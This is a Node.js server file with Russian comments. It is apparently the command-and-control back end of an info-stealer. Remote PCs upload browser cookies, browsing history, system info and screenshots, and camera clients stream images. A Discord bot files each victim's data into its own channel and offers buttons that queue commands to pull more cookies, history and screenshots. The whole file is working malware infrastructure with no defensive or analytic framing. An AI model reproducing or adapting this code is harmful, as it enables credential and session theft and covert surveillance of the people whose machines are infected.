// server.js
import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
import { WebSocketServer } from "ws";
import http from "http";
import { fileURLToPath } from "url";
import { dirname } from "path";
import crypto from "crypto";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
app.use(express.json({ limit: "100mb" }));

// ---------- Конфигурация ----------
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;

const CATEGORY_BASE_PC = "Все ПК";
const CATEGORY_BASE_CAM = "Камеры";
const LOG_CATEGORY = "Логи";
const LOG_CHANNEL = "server-logs";

const ONLINE_TIMEOUT = 3*60*1000;
const PC_DISCORD_UPLOAD_INTERVAL = 60*1000;
const CAMERA_DISCORD_UPLOAD_INTERVAL = 30*1000;
const LOG_THROTTLE_DEFAULT = 60*1000;
const CATEGORY_MAX_CHILDREN = 50;
const MAX_FILE_SIZE = 6*1024*1024;

// ---------- Состояние ----------
const onlinePCs = {};
const pendingCommands = {};
const channelByPC = {};
const channelByCam = {};
const wsCameraClients = {};
const camLastUpload = {};
const pcFileLastSent = {};
const lastLogTimestamps = {};

let logCategoryCache = null;
let logChannelCache = null;
let categoryCacheByGuild = new Map();
let channelCacheByGuild = new Map();

// ---------- Discord Bot ----------
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", ()=>console.log(`✅ Бот вошёл как ${bot.user.tag}`));

// ---------- Утилиты ----------
function shortHash(s,len=8){ return crypto.createHash('sha1').update(s).digest('hex').slice(0,len); }
function safeChannelName(prefix,id){ return `${prefix}-${shortHash(id,8)}`.toLowerCase().replace(/[^a-z0-9\-]/g,'-').slice(0,90); }

async function throttleLog(key,minIntervalMs=LOG_THROTTLE_DEFAULT){
    const now = Date.now();
    const last = lastLogTimestamps[key] || 0;
    if(now - last < minIntervalMs) return false;
    lastLogTimestamps[key] = now;
    return true;
}

async function logToDiscord(msg,key=null,minIntervalMs=LOG_THROTTLE_DEFAULT){
    try{
        if(key && !(await throttleLog(key,minIntervalMs))) return;
        const guild = await bot.guilds.fetch(GUILD_ID);
        const channel = await getOrCreateLogChannel(guild);
        await channel.send(`[${new Date().toISOString()}] ${msg}`);
    }catch(e){ console.error("Ошибка логирования:",e); }
}

// ---------- Категории и каналы ----------
async function getOrCreateCategory(guild,name){
    const gid = guild.id;
    if(!categoryCacheByGuild.has(gid)) categoryCacheByGuild.set(gid,{});
    const cache = categoryCacheByGuild.get(gid);
    if(cache[name]) return cache[name];

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c=>c.type===ChannelType.GuildCategory && c.name===name);
    if(matches.size >= 1){ cache[name] = matches.first(); return matches.first(); }

    const created = await guild.channels.create({ name, type: ChannelType.GuildCategory });
    cache[name] = created;
    return created;
}

async function getOrCreateTextChannel(guild,name,parentId){
    const gid = guild.id;
    if(!channelCacheByGuild.has(gid)) channelCacheByGuild.set(gid,{});
    const cache = channelCacheByGuild.get(gid);
    const key = `${name}::${parentId}`;
    if(cache[key]) return cache[key];

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c=>c.type===ChannelType.GuildText && c.name===name && c.parentId===parentId);
    if(matches.size>=1){ cache[key] = matches.first(); return matches.first(); }

    const created = await guild.channels.create({name,type:ChannelType.GuildText,parent:parentId});
    cache[key] = created;
    await logToDiscord(`Создан канал ${name}`,`channel_created:${name}`,5*60*1000);
    return created;
}

async function getOrCreateLogChannel(guild){
    if(logChannelCache) return logChannelCache;
    const category = logCategoryCache || await getOrCreateCategory(guild,LOG_CATEGORY);
    logCategoryCache = category;

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c=>c.type===ChannelType.GuildText && c.name===LOG_CHANNEL && c.parentId===category.id);
    if(matches.size>0){ logChannelCache = matches.first(); return matches.first(); }

    const created = await guild.channels.create({ name: LOG_CHANNEL, type: ChannelType.GuildText, parent: category.id });
    logChannelCache = created;
    return created;
}

// ---------- Кнопки ----------
function createControlButtons(pcId){
    const safePcId = encodeURIComponent(pcId);
    return [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`check_online|${safePcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`get_cookies|${safePcId}`).setLabel("Куки").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("История").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
    )];
}

function safeStringify(obj,maxLen=MAX_FILE_SIZE){
    try{
        let s=JSON.stringify(obj,null,2);
        if(Buffer.byteLength(s)<=maxLen) return s;
        return s.slice(0,maxLen-100)+'\n...TRUNCATED...';
    }catch(e){ return 'serialization_error'; }
}

// ---------- Обработка кнопок ----------
bot.on("interactionCreate",async interaction=>{
    if(!interaction.isButton()) return;
    const [command,encodedPcId] = interaction.customId.split("|");
    const pcId = decodeURIComponent(encodedPcId);
    const isOnline = onlinePCs[pcId] && (Date.now() - onlinePCs[pcId] < ONLINE_TIMEOUT);

    const replyOptions={ephemeral:true};
    if(command==="check_online"){ replyOptions.content = isOnline ? `✅ ПК ${pcId} онлайн` : `❌ ПК ${pcId} оффлайн`; await interaction.reply(replyOptions); return; }
    if(!isOnline){ replyOptions.content = `❌ ПК ${pcId} оффлайн`; await interaction.reply(replyOptions); return; }

    if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
    pendingCommands[pcId].push(command);
    replyOptions.content = `✅ Команда "${command}" отправлена ПК ${pcId}`;
    await interaction.reply(replyOptions);
});

// ---------- Upload PC ----------
app.post("/upload-pc", async (req,res)=>{
    try{
        const { pcId, cookies, history, systemInfo, screenshot } = req.body;
        if(!pcId) return res.status(400).json({error:"pcId required"});
        const isNewPc = !onlinePCs[pcId];
        onlinePCs[pcId] = Date.now();

        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild,CATEGORY_BASE_PC);
        const channelName = safeChannelName('pc',pcId);
        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
        const finalChannel = channel || await getOrCreateTextChannel(guild,channelName,category.id);
        channelByPC[pcId] = finalChannel.id;

        const now = Date.now();
        const lastSent = pcFileLastSent[pcId] || 0;
        const shouldSendFiles = (now - lastSent) > PC_DISCORD_UPLOAD_INTERVAL;

        const files=[];
        if(shouldSendFiles){
            if(cookies) files.push({attachment:Buffer.from(safeStringify({cookies})),name:`${channelName}-cookies.json`});
            if(history) files.push({attachment:Buffer.from(safeStringify({history})),name:`${channelName}-history.json`});
            if(systemInfo) files.push({attachment:Buffer.from(safeStringify({systemInfo})),name:`${channelName}-system.json`});
            if(screenshot){
                const buf = Buffer.from(screenshot,"base64");
                if(buf.length <= MAX_FILE_SIZE) files.push({attachment:buf,name:`${channelName}-screenshot.jpeg`});
            }
        }

        const messageOptions = { components: createControlButtons(pcId) };
        if(files.length) messageOptions.files = files; else messageOptions.content = `🟢 ПК ${pcId} обновлён`;
        await finalChannel.send(messageOptions);
        if(files.length) pcFileLastSent[pcId] = now;
        if(isNewPc) await logToDiscord(`🖥 Новый ПК зарегистрирован: ${pcId}`,`pc_registered:${pcId}`,5*60*1000);

        res.json({success:true});
    }catch(e){ await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`); res.status(500).json({error:e.message}); }
});

// ---------- Upload Camera ----------
app.post("/upload-cam", async (req,res)=>{
    try{
        const { camId, screenshot } = req.body;
        if(!camId || !screenshot) return res.status(400).json({error:"camId and screenshot required"});
        if(wsCameraClients[camId]) wsCameraClients[camId].forEach(ws=>{ try{ ws.send(screenshot); }catch(e){} });
        const now = Date.now();
        const last = camLastUpload[camId] || 0;
        const shouldSendToDiscord = (now - last) > CAMERA_DISCORD_UPLOAD_INTERVAL;
        camLastUpload[camId] = now;

        if(shouldSendToDiscord){
            const guild = await bot.guilds.fetch(GUILD_ID);
            const category = await getOrCreateCategory(guild,CATEGORY_BASE_CAM);
            const channelName = safeChannelName('cam',camId);
            const channel = channelByCam[camId] ? await guild.channels.fetch(channelByCam[camId]).catch(()=>null) : null;
            const finalChannel = channel || await getOrCreateTextChannel(guild,channelName,category.id);
            channelByCam[camId] = finalChannel.id;
            const buffer = Buffer.from(screenshot,"base64");
            if(buffer.length <= MAX_FILE_SIZE) await finalChannel.send({ files: [{ attachment: buffer, name: `${channelName}.jpg` }] });
        }
        res.json({success:true});
    }catch(e){ await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`); res.status(500).json({error:e.message}); }
});

// ---------- Ping ----------
app.post("/ping",(req,res)=>{
    const { pcId } = req.body;
    if(!pcId) return res.status(400).json({error:"pcId required"});
    onlinePCs[pcId] = Date.now();
    const commands = pendingCommands[pcId] || [];
    pendingCommands[pcId] = [];
    res.json({commands});
});

// ---------- WebSocket ----------
const wss = new WebSocketServer({ noServer:true });
wss.on("connection", (ws,req)=>{
    const url = new URL(req.url, `http://${req.headers.host}`);
    const camId = url.searchParams.get("camId");
    if(!camId) return ws.close();
    if(!wsCameraClients[camId]) wsCameraClients[camId] = [];
    wsCameraClients[camId].push(ws);
    ws.on("close", ()=>{ wsCameraClients[camId] = wsCameraClients[camId].filter(c=>c!==ws); });
});

// ---------- Запуск ----------
const server = http.createServer(app);
server.on("upgrade",(req,socket,head)=>{ wss.handleUpgrade(req,socket,head,ws=>wss.emit("connection",ws,req)); });
const PORT = process.env.PORT || 3000;
server.listen(PORT,()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
bot.login(DISCORD_BOT_TOKEN);

process.on("uncaughtException", e => logToDiscord(`💥 Uncaught Exception: ${e.message}`));
process.on("unhandledRejection", e => logToDiscord(`💥 Unhandled Rejection: ${e}`));
